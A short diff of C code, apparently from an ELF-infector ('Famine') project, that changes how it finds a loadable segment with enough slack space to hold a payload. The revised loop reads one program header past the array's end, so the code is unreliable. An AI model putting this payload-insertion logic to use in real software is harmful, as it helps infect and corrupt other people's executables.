@@ -5,7 +5,6 @@
 #include <stdbool.h>
 #include <elf.h>
 #include <stddef.h>
-#include <sys/syscall.h>
 #include "famine.h"
 
 bool isValidElf64(const Elf64_Ehdr *ehdr) {
@@ -16,9 +15,9 @@ bool isValidElf64(const Elf64_Ehdr *ehdr) {
 }
 
 Elf64_Phdr *findUsableSegment(Elf64_Phdr *phdr, Elf64_Half e_phnum) {
-	for (int i = 0; i < e_phnum - 1; i++) {
-		if (phdr[i].p_flags & PF_X && \
-            (int) (phdr[i + 1].p_offset - (phdr[i].p_offset + phdr[i].p_filesz)) > PAYLOAD_SIZE) {
+	for (int i = 0; i < e_phnum; i++) {
+		if (phdr[i].p_type == PT_LOAD &&
+			(int) (phdr[i + 1].p_offset - (phdr[i].p_offset + phdr[i].p_filesz)) > PAYLOAD_SIZE) {
 			return &phdr[i];
 		}
 	}
